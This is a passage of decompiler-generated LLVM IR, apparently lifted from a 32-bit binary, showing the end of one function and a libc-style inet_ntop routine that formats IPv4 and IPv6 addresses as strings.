  store i32 28, i32* %v1_80566b8, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* %eax.global-to-local, align 4
  %v0_80566d1.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_80566d1

dec_label_pc_80566c2:                             ; preds = %dec_label_pc_8056698
  %v2_80566a0 = ptrtoint i32* %stack_var_-33 to i32
  %tmp28 = bitcast i8** %stack_var_-56 to i32*
  %v3_80566c54 = load i32, i32* %tmp28, align 4
  %tmp29 = bitcast i8** %stack_var_-92 to i32*
  store i32 %v3_80566c54, i32* %tmp29, align 4
  %v0_80566c9.cast = inttoptr i32 %v3_80566c54 to i8*
  %v4_80566c9 = call i32 @strcpy(i8* %v0_80566c9.cast, i32 %v2_80566a0)
  store i32 %v4_80566c9, i32* %eax.global-to-local, align 4
  %v0_80566ce = load i32, i32* @esp, align 4
  %v6_80566ce = icmp eq i32 %v0_80566ce, -16
  store i1 %v6_80566ce, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_80566d1

dec_label_pc_80566d1:                             ; preds = %dec_label_pc_80566b3, %dec_label_pc_80566c2
  %v0_80566d8 = phi i32 [ 0, %dec_label_pc_80566b3 ], [ %v4_80566c9, %dec_label_pc_80566c2 ]
  %v0_80566d1 = phi i32 [ %v0_80566d1.pre, %dec_label_pc_80566b3 ], [ %v15_80565ce, %dec_label_pc_80566c2 ]
  %v9_80566d1 = icmp eq i32 %v0_80566d1, -60
  store i1 %v9_80566d1, i1* %zf.global-to-local, align 1
  store i32 %v0_80565ca, i32* @esi, align 4
  store i32 %v0_80565c9, i32* @edi, align 4
  ret i32 %v0_80566d8

; uselistorder directives
  uselistorder i32 %v0_805668f, { 2, 0, 1 }
  uselistorder i8 %v2_8056669, { 1, 0 }
  uselistorder i32 %v0_805664e, { 1, 0 }
  uselistorder i1 %v11_805661f, { 1, 0 }
  uselistorder i32 %v1_8056616, { 1, 0 }
  uselistorder i32 %v5_8056604, { 1, 0 }
  uselistorder i32 %v0_805668f30, { 1, 2, 0 }
  uselistorder i32* %stack_var_-33, { 2, 0, 1 }
  uselistorder i8** %stack_var_-92, { 0, 2, 1 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 11, 5, 6, 7, 8, 9, 10, 12 }
  uselistorder i32 -16, { 0, 1, 23, 24, 25, 14, 16, 17, 13, 15, 8, 18, 12, 19, 20, 21, 22, 26, 36, 37, 9, 31, 27, 10, 28, 29, 30, 32, 33, 11, 34, 35, 2, 3, 4, 5, 6, 7 }
  uselistorder i32 42, { 2, 1, 0 }
  uselistorder i16 10, { 1, 3, 2, 4, 0, 5 }
  uselistorder i32 43, { 3, 4, 5, 1, 2, 0 }
  uselistorder i8 48, { 11, 7, 8, 0, 9, 12, 13, 1, 10, 2, 3, 5, 4, 6, 14 }
  uselistorder i8 100, { 1, 2, 0 }
  uselistorder i1* @df, { 5, 41, 42, 0, 1, 43, 44, 45, 50, 2, 3, 33, 4, 55, 56, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 34, 35, 36, 37, 38, 39, 40, 46, 47, 48, 49, 51, 52, 53, 54 }
  uselistorder i32 -65536, { 1, 2, 3, 0 }
  uselistorder label %dec_label_pc_80566d1, { 1, 0 }
  uselistorder label %dec_label_pc_805666f, { 2, 1, 0 }
}

define i32 @__GI_inet_ntop(i32 %arg1, i32 %arg2, i8* %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i8*, align 4
  store i8* %arg3, i8** %stack_var_12, align 4
  %stack_var_-94 = alloca i32, align 4
  %stack_var_-124 = alloca i8*, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-108 = alloca i32, align 4
  %v0_80566da = load i32, i32* @edi, align 4
  %v0_80566db = load i32, i32* @esi, align 4
  %v0_80566dc = load i32, i32* @ebx, align 4
  %v15_80566dd = ptrtoint i32* %stack_var_-108 to i32
  store i32 %arg1, i32* %eax.global-to-local, align 4
  %v9_80566e4 = icmp eq i32 %arg1, 2
  br i1 %v9_80566e4, label %dec_label_pc_80566f4, label %dec_label_pc_80566e9

dec_label_pc_80566e9:                             ; preds = %entry
  %v9_80566e9 = icmp eq i32 %arg1, 10
  %v1_80566ec = icmp eq i1 %v9_80566e9, false
  br i1 %v1_80566ec, label %dec_label_pc_8056893, label %dec_label_pc_805670c

dec_label_pc_80566f4:                             ; preds = %entry
  %v4_80566f4 = ptrtoint i8* %arg3 to i32
  store i32 %v4_80566f4, i32* @edx, align 4
  store i32 %arg4, i32* @ecx, align 4
  store i32 %arg2, i32* @eax, align 4
  %v3_8056700 = call i32 @inet_ntop4(i32 %v0_80566dc, i32 %v0_80566db, i32 %v0_80566da)
  store i32 %v3_8056700, i32* %eax.global-to-local, align 4
  store i32 %v3_8056700, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80568a0

dec_label_pc_805670c:                             ; preds = %dec_label_pc_80566e9
  store i32 %arg1, i32* %stack_var_-112, align 4
  %v2_8056711 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_8056711, i32* %eax.global-to-local, align 4
  %tmp43 = bitcast i32* %stack_var_-48 to i8*
  store i8* %tmp43, i8** %stack_var_-124, align 4
  %v6_8056716 = call i32 @__GI_memset(i8* %tmp43, i32 0, i32 32)
  store i32 %v6_8056716, i32* %eax.global-to-local, align 4
  store i32 0, i32* %ecx.global-to-local, align 4
  %v2_8056738 = add i32 %arg2, 1
  br label %dec_label_pc_8056722

dec_label_pc_8056722:                             ; preds = %dec_label_pc_8056722.dec_label_pc_8056722_crit_edge, %dec_label_pc_805670c
  %v1_8056745 = phi i32 [ %v15_80566dd, %dec_label_pc_805670c ], [ %v1_8056745.pre, %dec_label_pc_8056722.dec_label_pc_8056722_crit_edge ]
  %v0_805673d70 = phi i32 [ 0, %dec_label_pc_805670c ], [ %v0_8056749.pre, %dec_label_pc_8056722.dec_label_pc_8056722_crit_edge ]
  %v1_805672b = ashr i32 %v0_805673d70, 31
  %v2_805672c = zext i32 %v0_805673d70 to i64
  %v4_805672c = zext i32 %v1_805672b to i64
  %v5_805672c = mul nuw i64 %v4_805672c, 4294967296
  %v6_805672c = or i64 %v5_805672c, %v2_805672c
  %v8_805672c = sdiv i64 %v6_805672c, 2
  %v9_805672c = trunc i64 %v8_805672c to i32
  store i32 %v9_805672c, i32* %eax.global-to-local, align 4
  store i32 %arg2, i32* %edx.global-to-local, align 4
  store i32 %v9_805672c, i32* %ebx.global-to-local, align 4
  %v2_8056734 = add i32 %v0_805673d70, %arg2
  %v3_8056734 = inttoptr i32 %v2_8056734 to i8*
  %v4_8056734 = load i8, i8* %v3_8056734, align 1
  %v5_8056734 = zext i8 %v4_8056734 to i32
  store i32 %v5_8056734, i32* %eax.global-to-local, align 4
  %v3_8056738 = add i32 %v2_8056738, %v0_805673d70
  %v4_8056738 = inttoptr i32 %v3_8056738 to i8*
  %v5_8056738 = load i8, i8* %v4_8056738, align 1
  %v6_8056738 = zext i8 %v5_8056738 to i32
  store i32 %v6_8056738, i32* %edx.global-to-local, align 4
  %v1_805673d = add i32 %v0_805673d70, 2
  store i32 %v1_805673d, i32* %ecx.global-to-local, align 4
  %v2_8056740 = mul nuw nsw i32 %v5_8056734, 256
  %v2_8056743 = or i32 %v6_8056738, %v2_8056740
  store i32 %v2_8056743, i32* %eax.global-to-local, align 4
  %v3_8056745 = mul i32 %v9_805672c, 4
  %v4_8056745 = add i32 %v3_8056745, 60
  %v5_8056745 = add i32 %v4_8056745, %v1_8056745
  %v6_8056745 = inttoptr i32 %v5_8056745 to i32*
  store i32 %v2_8056743, i32* %v6_8056745, align 4
  %v0_8056749.pre = load i32, i32* %ecx.global-to-local, align 4
  %v7_805674c = icmp sgt i32 %v0_8056749.pre, 15
  br i1 %v7_805674c, label %dec_label_pc_805674e, label %dec_label_pc_8056722.dec_label_pc_8056722_crit_edge

dec_label_pc_8056722.dec_label_pc_8056722_crit_edge: ; preds = %dec_label_pc_8056722
  %v1_8056745.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056722

dec_label_pc_805674e:                             ; preds = %dec_label_pc_8056722
  %v4_805670c = ptrtoint i32* %stack_var_-112 to i32
  store i32 0, i32* %edx.global-to-local, align 4
  store i32 -1, i32* @edi, align 4
  store i32 -1, i32* %eax.global-to-local, align 4
  %v0_8056758.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8056758

dec_label_pc_8056758:                             ; preds = %dec_label_pc_805674e, %dec_label_pc_8056785
  %v0_805678569 = phi i32 [ 0, %dec_label_pc_805674e ], [ %v1_8056785, %dec_label_pc_8056785 ]
  %v0_805677068 = phi i32 [ -1, %dec_label_pc_805674e ], [ %v0_80567708, %dec_label_pc_8056785 ]
  %v0_805679067 = phi i32 [ -1, %dec_label_pc_805674e ], [ %v0_80567759, %dec_label_pc_8056785 ]
  %v0_805679b66 = phi i32 [ -1, %dec_label_pc_805674e ], [ %v0_805678013, %dec_label_pc_8056785 ]
  %v2_8056758 = mul nuw nsw i32 %v0_805678569, 4
  %v3_8056758 = add nuw nsw i32 %v2_8056758, 60
  %v4_8056758 = add i32 %v3_8056758, %v0_8056758.pre
  %v5_8056758 = inttoptr i32 %v4_8056758 to i32*
  %v6_8056758 = load i32, i32* %v5_8056758, align 4
  %v7_8056758 = icmp eq i32 %v6_8056758, 0
  %v1_805675d = icmp eq i1 %v7_8056758, false
  %v10_8056770 = icmp eq i32 %v0_805677068, -1
  br i1 %v1_805675d, label %dec_label_pc_8056770, label %dec_label_pc_805675f

dec_label_pc_805675f:                             ; preds = %dec_label_pc_8056758
  %v1_8056762 = icmp eq i1 %v10_8056770, false
  br i1 %v1_8056762, label %dec_label_pc_805676d, label %dec_label_pc_8056764

dec_label_pc_8056764:                             ; preds = %dec_label_pc_805675f
  store i32 %v0_805678569, i32* %eax.global-to-local, align 4
  store i32 1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056785

dec_label_pc_805676d:                             ; preds = %dec_label_pc_805675f
  %v0_805676d = load i32, i32* %ebx.global-to-local, align 4
  %v1_805676d = add i32 %v0_805676d, 1
  store i32 %v1_805676d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8056785

dec_label_pc_8056770:                             ; preds = %dec_label_pc_8056758
  br i1 %v10_8056770, label %dec_label_pc_8056785, label %dec_label_pc_8056775

dec_label_pc_8056775:                             ; preds = %dec_label_pc_8056770
  %v10_8056775 = icmp eq i32 %v0_805679067, -1
  %v0_805677e.pre = load i32, i32* %ebx.global-to-local, align 4
  %v1_805677a = load i32, i32* @ebp, align 4
  %v7_805677c = icmp sgt i32 %v0_805677e.pre, %v1_805677a
  %or.cond = or i1 %v10_8056775, %v7_805677c
  br i1 %or.cond, label %dec_label_pc_805677e, label %dec_label_pc_8056782

dec_label_pc_805677e:                             ; preds = %dec_label_pc_8056775
  store i32 %v0_805677e.pre, i32* @ebp, align 4
  store i32 %v0_805679b66, i32* @edi, align 4
  br label %dec_label_pc_8056782

dec_label_pc_8056782:                             ; preds = %dec_label_pc_8056775, %dec_label_pc_805677e
  %v0_805677511 = phi i32 [ %v0_805679b66, %dec_label_pc_805677e ], [ %v0_805679067, %dec_label_pc_8056775 ]
  store i32 -1, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8056785

dec_label_pc_8056785:                             ; preds = %dec_label_pc_8056770, %dec_label_pc_805676d, %dec_label_pc_8056764, %dec_label_pc_8056782
  %v0_805678013 = phi i32 [ %v0_805679b66, %dec_label_pc_8056770 ], [ %v0_805679b66, %dec_label_pc_805676d ], [ %v0_805678569, %dec_label_pc_8056764 ], [ -1, %dec_label_pc_8056782 ]
  %v0_80567708 = phi i32 [ -1, %dec_label_pc_8056770 ], [ %v0_805677068, %dec_label_pc_805676d ], [ %v0_805678569, %dec_label_pc_8056764 ], [ -1, %dec_label_pc_8056782 ]
  %v0_80567759 = phi i32 [ %v0_805679067, %dec_label_pc_8056770 ], [ %v0_805679067, %dec_label_pc_805676d ], [ %v0_805679067, %dec_label_pc_8056764 ], [ %v0_805677511, %dec_label_pc_8056782 ]
  %v1_8056785 = add nuw nsw i32 %v0_805678569, 1
  store i32 %v1_8056785, i32* %edx.global-to-local, align 4
  %exitcond = icmp eq i32 %v1_8056785, 8
  br i1 %exitcond, label %dec_label_pc_805678b, label %dec_label_pc_8056758

dec_label_pc_805678b:                             ; preds = %dec_label_pc_8056785
  %v10_805678b = icmp eq i32 %v0_805678013, -1
  br i1 %v10_805678b, label %dec_label_pc_805679d, label %dec_label_pc_8056790

dec_label_pc_8056790:                             ; preds = %dec_label_pc_805678b
  %v10_8056790 = icmp eq i32 %v0_80567759, -1
  %v0_8056799.pre = load i32, i32* %ebx.global-to-local, align 4
  br i1 %v10_8056790, label %dec_label_pc_8056799, label %dec_label_pc_8056795

dec_label_pc_8056795:                             ; preds = %dec_label_pc_8056790
  %v1_8056795 = load i32, i32* @ebp, align 4
  %v7_8056797 = icmp sgt i32 %v0_8056799.pre, %v1_8056795
  br i1 %v7_8056797, label %dec_label_pc_8056799, label %dec_label_pc_805679d

dec_label_pc_8056799:                             ; preds = %dec_label_pc_8056790, %dec_label_pc_8056795
  store i32 %v0_8056799.pre, i32* @ebp, align 4
  store i32 %v0_805678013, i32* @edi, align 4
  br label %dec_label_pc_805679d

dec_label_pc_805679d:                             ; preds = %dec_label_pc_8056795, %dec_label_pc_805678b, %dec_label_pc_8056799
  %v5_80567aa = phi i32 [ %v0_80567759, %dec_label_pc_8056795 ], [ %v0_80567759, %dec_label_pc_805678b ], [ %v0_805678013, %dec_label_pc_8056799 ]
  %v10_805679d = icmp eq i32 %v5_80567aa, -1
  br i1 %v10_805679d, label %dec_label_pc_80567ad, label %dec_label_pc_80567a2

dec_label_pc_80567a2:                             ; preds = %dec_label_pc_805679d
  %v0_80567a2 = load i32, i32* @ebp, align 4
  %v1_80567a2 = add i32 %v0_80567a2, -1
  %v6_80567a2 = sub i32 0, %v0_80567a2
  %v7_80567a2 = and i32 %v0_80567a2, %v6_80567a2
  %v8_80567a2 = icmp slt i32 %v7_80567a2, 0
  %v9_80567a2 = icmp eq i32 %v1_80567a2, 0
  %v10_80567a2 = icmp slt i32 %v1_80567a2, 0
  store i32 -1, i32* %eax.global-to-local, align 4
  %v3_80567aa = icmp ne i1 %v10_80567a2, %v8_80567a2
  %v4_80567aa = or i1 %v9_80567a2, %v3_80567aa
  %v7_80567aa = select i1 %v4_80567aa, i32 -1, i32 %v5_80567aa
  store i32 %v7_80567aa, i32* @edi, align 4
  br label %dec_label_pc_80567ad

dec_label_pc_80567ad:                             ; preds = %dec_label_pc_805679d, %dec_label_pc_80567a2
  %v0_805684d18 = phi i32 [ %v5_80567aa, %dec_label_pc_805679d ], [ %v7_80567aa, %dec_label_pc_80567a2 ]
  %v2_80567ad = ptrtoint i32* %stack_var_-94 to i32
  store i32 %v2_80567ad, i32* @ebx, align 4
  %v3_805682f = add i32 %v4_805670c, 64
  %v12_80567ed = icmp eq i32 %tmp, 65535
  store i32 0, i32* @esi, align 4
  %v10_805684d58 = icmp eq i32 %v0_805684d18, -1
  %v1_80567f5 = icmp eq i1 %v12_80567ed, false
  br label %dec_label_pc_80567b8

dec_label_pc_80567b8:                             ; preds = %dec_label_pc_80567ad, %dec_label_pc_8056843
  %v10_805684d65 = phi i1 [ %v10_805684d58, %dec_label_pc_80567ad ], [ %v10_805684d, %dec_label_pc_8056843 ]
  %v0_80567d264 = phi i32 [ 0, %dec_label_pc_80567ad ], [ %v1_8056843, %dec_label_pc_8056843 ]
  %v1_80567c863 = phi i32 [ %v0_805684d18, %dec_label_pc_80567ad ], [ %v0_805684d.pre, %dec_label_pc_8056843 ]
  %v0_80567d662 = phi i32 [ %v2_80567ad, %dec_label_pc_80567ad ], [ %v0_80567cc19, %dec_label_pc_8056843 ]
  %stack_var_-120.161 = phi i8* [ null, %dec_label_pc_80567ad ], [ %stack_var_-120.0, %dec_label_pc_8056843 ]
  %stack_var_-116.160 = phi i32 [ 32, %dec_label_pc_80567ad ], [ %stack_var_-116.0, %dec_label_pc_8056843 ]
  br i1 %v10_805684d65, label %dec_label_pc_80567d2, label %dec_label_pc_80567bd

dec_label_pc_80567bd:                             ; preds = %dec_label_pc_80567b8
  %v2_80567bd = sub i32 %v0_80567d264, %v1_80567c863
  %v8_80567bd = xor i32 %v0_80567d264, %v1_80567c863
  %v9_80567bd = xor i32 %v2_80567bd, %v0_80567d264
  %v10_80567bd = and i32 %v9_80567bd, %v8_80567bd
  %v11_80567bd = icmp slt i32 %v10_80567bd, 0
  %v12_80567bd = icmp eq i32 %v2_80567bd, 0
  %v13_80567bd = icmp slt i32 %v2_80567bd, 0
  %v2_80567bf = icmp eq i1 %v13_80567bd, %v11_80567bd
  br i1 %v2_80567bf, label %dec_label_pc_80567c1, label %dec_label_pc_80567d2

dec_label_pc_80567c1:                             ; preds = %dec_label_pc_80567bd
  %v1_80567c1 = load i32, i32* @ebp, align 4
  %v2_80567c1 = add i32 %v1_80567c1, %v1_80567c863
  store i32 %v2_80567c1, i32* %eax.global-to-local, align 4
  %v2_80567c4 = sub i32 %v0_80567d264, %v2_80567c1
  %v8_80567c4 = xor i32 %v2_80567c1, %v0_80567d264
  %v9_80567c4 = xor i32 %v2_80567c4, %v0_80567d264
  %v10_80567c4 = and i32 %v9_80567c4, %v8_80567c4
  %v11_80567c4 = icmp slt i32 %v10_80567c4, 0
  %v13_80567c4 = icmp slt i32 %v2_80567c4, 0
  %v2_80567c6 = icmp eq i1 %v13_80567c4, %v11_80567c4
  br i1 %v2_80567c6, label %dec_label_pc_80567d2, label %dec_label_pc_80567c8

dec_label_pc_80567c8:                             ; preds = %dec_label_pc_80567c1
  %v1_80567ca = icmp eq i1 %v12_80567bd, false
  br i1 %v1_80567ca, label %dec_label_pc_8056843, label %dec_label_pc_80567cc

dec_label_pc_80567cc:                             ; preds = %dec_label_pc_80567c8
  %v1_80567cc = inttoptr i32 %v0_80567d662 to i8*
  store i8 58, i8* %v1_80567cc, align 1
  %v0_80567cf = load i32, i32* @ebx, align 4
  %v1_80567cf = add i32 %v0_80567cf, 1
  store i32 %v1_80567cf, i32* @ebx, align 4
  br label %dec_label_pc_8056843

dec_label_pc_80567d2:                             ; preds = %dec_label_pc_80567bd, %dec_label_pc_80567c1, %dec_label_pc_80567b8
  %v1_80567d2 = icmp eq i32 %v0_80567d264, 0
  br i1 %v1_80567d2, label %dec_label_pc_80567da, label %dec_label_pc_80567d6

dec_label_pc_80567d6:                             ; preds = %dec_label_pc_80567d2
  %v1_80567d6 = inttoptr i32 %v0_80567d662 to i8*
  store i8 58, i8* %v1_80567d6, align 1
  %v0_80567d9 = load i32, i32* @ebx, align 4
  %v1_80567d9 = add i32 %v0_80567d9, 1
  store i32 %v1_80567d9, i32* @ebx, align 4
  %v0_80567da.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_80567da

dec_label_pc_80567da:                             ; preds = %dec_label_pc_80567d2, %dec_label_pc_80567d6
  %v0_8056838 = phi i32 [ %v0_80567d662, %dec_label_pc_80567d2 ], [ %v1_80567d9, %dec_label_pc_80567d6 ]
  %v1_805682f = phi i32 [ 0, %dec_label_pc_80567d2 ], [ %v0_80567da.pre, %dec_label_pc_80567d6 ]
  %v9_80567da = icmp eq i32 %v1_805682f, 6
  %v1_80567dd = icmp eq i1 %v9_80567da, false
  br i1 %v1_80567dd, label %dec_label_pc_805682e, label %dec_label_pc_80567df

dec_label_pc_80567df:                             ; preds = %dec_label_pc_80567da
  %v0_80567df = load i32, i32* @edi, align 4
  %v1_80567df = icmp eq i32 %v0_80567df, 0
  %v1_80567e1 = icmp eq i1 %v1_80567df, false
  br i1 %v1_80567e1, label %dec_label_pc_805682e, label %dec_label_pc_80567e3

dec_label_pc_80567e3:                             ; preds = %dec_label_pc_80567df
  %v0_80567e3 = load i32, i32* @ebp, align 4
  %v9_80567e3 = icmp eq i32 %v0_80567e3, 6
  br i1 %v9_80567e3, label %dec_label_pc_80567f7, label %dec_label_pc_80567e8

dec_label_pc_80567e8:                             ; preds = %dec_label_pc_80567e3
  %v9_80567e8 = icmp eq i32 %v0_80567e3, 5
  %v1_80567eb = icmp eq i1 %v9_80567e8, false
  br i1 %v1_80567eb, label %dec_label_pc_805682e, label %dec_label_pc_80567ed

dec_label_pc_80567ed:                             ; preds = %dec_label_pc_80567e8
  br i1 %v1_80567f5, label %dec_label_pc_805682e, label %dec_label_pc_80567f7

dec_label_pc_80567f7:                             ; preds = %dec_label_pc_80567ed, %dec_label_pc_80567e3
  %v2_80567fd = sub i32 %v0_8056838, %v2_80567ad
  store i32 %v2_80567fd, i32* @esi, align 4
  %v2_8056808 = sub i32 46, %v2_80567fd
  store i32 %v2_8056808, i32* @ecx, align 4
  store i32 %v0_8056838, i32* @edx, align 4
  %v1_805680c = add i32 %arg2, 12
  store i32 %v1_805680c, i32* @eax, align 4
  %v0_805680f = load i8*, i8** %stack_var_-124, align 4
  %v1_805680f = ptrtoint i8* %v0_805680f to i32
  %v3_805680f = ptrtoint i8* %stack_var_-120.161 to i32
  %v5_805680f = call i32 @inet_ntop4(i32 %v1_805680f, i32 %v3_805680f, i32 %stack_var_-116.160)
  store i32 %v5_805680f, i32* %eax.global-to-local, align 4
  store i32 0, i32* %edx.global-to-local, align 4
  %v1_8056816 = icmp eq i32 %v5_805680f, 0
  br i1 %v1_8056816, label %dec_label_pc_80568a0, label %dec_label_pc_805681e

dec_label_pc_805681e:                             ; preds = %dec_label_pc_80567f7
  %v0_8056821 = load i32, i32* @ebx, align 4
  %v5_8056821 = inttoptr i32 %v0_8056821 to i8*
  store i8* %v5_8056821, i8** %stack_var_-124, align 4
  %v3_8056822 = call i32 @strlen(i8* %v5_8056821)
  store i32 %v3_8056822, i32* %eax.global-to-local, align 4
  %v0_805682a = load i32, i32* @ebx, align 4
  %v3_805682a = add i32 %v0_805682a, %v3_8056822
  store i32 %v3_805682a, i32* @ebx, align 4
  %v0_8056852.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_8056852

dec_label_pc_805682e:                             ; preds = %dec_label_pc_80567ed, %dec_label_pc_80567e8, %dec_label_pc_80567df, %dec_label_pc_80567da
  %v0_805682e = load i32, i32* %eax.global-to-local, align 4
  store i32 %v0_805682e, i32* %stack_var_-112, align 4
  %v2_805682f = mul i32 %v1_805682f, 4
  %v4_805682f = add i32 %v3_805682f, %v2_805682f
  %v5_805682f = inttoptr i32 %v4_805682f to i32*
  %v6_805682f = load i32, i32* %v5_805682f, align 4
  %v5_8056838 = inttoptr i32 %v0_8056838 to i8*
  store i8* %v5_8056838, i8** %stack_var_-124, align 4
  %v6_8056839 = call i32 @sprintf(i32 %v0_8056838, i32 ptrtoint ([3 x i8]* @global_var_8061791.803 to i32), i32 %v6_805682f, i32 %v0_805682e)
  store i32 %v6_8056839, i32* %eax.global-to-local, align 4
  %v0_8056841 = load i32, i32* @ebx, align 4
  %v2_8056841 = add i32 %v0_8056841, %v6_8056839
  store i32 %v2_8056841, i32* @ebx, align 4
  br label %dec_label_pc_8056843

dec_label_pc_8056843:                             ; preds = %dec_label_pc_80567c8, %dec_label_pc_80567cc, %dec_label_pc_805682e
  %stack_var_-116.0 = phi i32 [ %v6_805682f, %dec_label_pc_805682e ], [ %stack_var_-116.160, %dec_label_pc_80567c8 ], [ %stack_var_-116.160, %dec_label_pc_80567cc ]
  %stack_var_-120.0 = phi i8* [ getelementptr inbounds ([3 x i8], [3 x i8]* @global_var_8061791.803, i32 0, i32 0), %dec_label_pc_805682e ], [ %stack_var_-120.161, %dec_label_pc_80567c8 ], [ %stack_var_-120.161, %dec_label_pc_80567cc ]
  %v0_80567cc19 = phi i32 [ %v2_8056841, %dec_label_pc_805682e ], [ %v0_80567d662, %dec_label_pc_80567c8 ], [ %v1_80567cf, %dec_label_pc_80567cc ]
  %v0_8056843 = load i32, i32* @esi, align 4
  %v1_8056843 = add i32 %v0_8056843, 1
  %v0_805684d.pre = load i32, i32* @edi, align 4
  store i32 %v1_8056843, i32* @esi, align 4
  %v7_8056847 = icmp sgt i32 %v1_8056843, 7
  %v10_805684d = icmp eq i32 %v0_805684d.pre, -1
  br i1 %v7_8056847, label %dec_label_pc_805684d, label %dec_label_pc_80567b8

dec_label_pc_805684d:                             ; preds = %dec_label_pc_8056843
  br i1 %v10_805684d, label %dec_label_pc_805685e, label %dec_label_pc_8056852

dec_label_pc_8056852:                             ; preds = %dec_label_pc_805684d, %dec_label_pc_805681e
  %v0_805685a = phi i32 [ %v0_80567cc19, %dec_label_pc_805684d ], [ %v3_805682a, %dec_label_pc_805681e ]
  %v0_8056852 = phi i32 [ %v0_805684d.pre, %dec_label_pc_805684d ], [ %v0_8056852.pre, %dec_label_pc_805681e ]
  %v1_8056852 = load i32, i32* @ebp, align 4
  %v2_8056852 = add i32 %v1_8056852, %v0_8056852
  store i32 %v2_8056852, i32* %eax.global-to-local, align 4
  %v9_8056855 = icmp eq i32 %v2_8056852, 8
  %v1_8056858 = icmp eq i1 %v9_8056855, false
  br i1 %v1_8056858, label %dec_label_pc_805685e, label %dec_label_pc_805685a

dec_label_pc_805685a:                             ; preds = %dec_label_pc_8056852
  %v1_805685a = inttoptr i32 %v0_805685a to i8*
  store i8 58, i8* %v1_805685a, align 1
  %v0_805685d = load i32, i32* @ebx, align 4
  %v1_805685d = add i32 %v0_805685d, 1
  store i32 %v1_805685d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805685e

dec_label_pc_805685e:                             ; preds = %dec_label_pc_8056852, %dec_label_pc_805684d, %dec_label_pc_805685a
  %v0_8056862 = phi i32 [ %v0_805685a, %dec_label_pc_8056852 ], [ %v0_80567cc19, %dec_label_pc_805684d ], [ %v1_805685d, %dec_label_pc_805685a ]
  store i32 %v2_80567ad, i32* %edx.global-to-local, align 4
  %v1_8056862 = add i32 %v0_8056862, 1
  store i32 %v1_8056862, i32* %eax.global-to-local, align 4
  %v1_8056865 = inttoptr i32 %v0_8056862 to i8*
  store i8 0, i8* %v1_8056865, align 1
  %v0_8056868 = load i32, i32* %eax.global-to-local, align 4
  %v1_8056868 = load i32, i32* %edx.global-to-local, align 4
  %v2_8056868 = sub i32 %v0_8056868, %v1_8056868
  store i32 %v2_8056868, i32* @eax, align 4
  %tmp75 = icmp ugt i32 %v2_8056868, %arg4
  br i1 %tmp75, label %dec_label_pc_8056870, label %dec_label_pc_805687d

dec_label_pc_8056870:                             ; preds = %dec_label_pc_805685e
  %v0_8056870 = load i8*, i8** %stack_var_-124, align 4
  %v1_8056870 = ptrtoint i8* %v0_8056870 to i32
  %v2_8056870 = call i32 @__errno_location(i32 %v1_8056870)
  store i32 %v2_8056870, i32* %eax.global-to-local, align 4
  %v1_8056875 = inttoptr i32 %v2_8056870 to i32*
  store i32 28, i32* %v1_8056875, align 4
  br label %dec_label_pc_805689e

dec_label_pc_805687d:                             ; preds = %dec_label_pc_805685e
  %v0_805687d = load i32, i32* @edi, align 4
  store i32 %v0_805687d, i32* %stack_var_-112, align 4
  %tmp45 = bitcast i8** %stack_var_12 to i32*
  %v3_80568802 = load i32, i32* %tmp45, align 4
  %tmp46 = bitcast i8** %stack_var_-124 to i32*
  store i32 %v3_80568802, i32* %tmp46, align 4
  %v0_8056887.cast = inttoptr i32 %v3_80568802 to i8*
  %v5_8056887 = call i32 @strcpy(i8* %v0_8056887.cast, i32 %v2_80567ad)
  store i32 %v5_8056887, i32* %eax.global-to-local, align 4
  store i32 %v5_8056887, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80568a0

dec_label_pc_8056893:                             ; preds = %dec_label_pc_80566e9
  %v1_8056893 = call i32 @__errno_location(i32 %v0_80566dc)
  store i32 %v1_8056893, i32* %eax.global-to-local, align 4
  %v1_8056898 = inttoptr i32 %v1_8056893 to i32*
  store i32 97, i32* %v1_8056898, align 4
  br label %dec_label_pc_805689e

dec_label_pc_805689e:                             ; preds = %dec_label_pc_8056870, %dec_label_pc_8056893
  store i32 0, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80568a0

dec_label_pc_80568a0:                             ; preds = %dec_label_pc_80567f7, %dec_label_pc_805687d, %dec_label_pc_80566f4, %dec_label_pc_805689e
  %v0_80568a3 = phi i32 [ 0, %dec_label_pc_80567f7 ], [ %v5_8056887, %dec_label_pc_805687d ], [ %v3_8056700, %dec_label_pc_80566f4 ], [ 0, %dec_label_pc_805689e ]
  store i32 %v0_80568a3, i32* %eax.global-to-local, align 4
  store i32 %v0_80566dc, i32* %ebx.global-to-local, align 4
  ret i32 %v0_80568a3

; uselistorder directives
  uselistorder i32 %v0_80568a3, { 1, 0 }
  uselistorder i32 %v0_8056862, { 1, 0 }
  uselistorder i1 %v10_805684d, { 1, 0 }
  uselistorder i32 %v0_805684d.pre, { 1, 0, 2 }
  uselistorder i32 %v1_8056843, { 1, 0, 2 }
  uselistorder i32 %v1_805682f, { 1, 0 }
  uselistorder i32 %v0_8056838, { 3, 2, 0, 1 }
  uselistorder i32 %v2_80567c4, { 1, 0 }
  uselistorder i32 %v2_80567bd, { 1, 2, 0 }
  uselistorder i32 %stack_var_-116.160, { 2, 1, 0 }
  uselistorder i8* %stack_var_-120.161, { 2, 1, 0 }
  uselistorder i32 %v0_80567d662, { 3, 2, 1, 0 }
  uselistorder i32 %v1_80567c863, { 2, 1, 0 }
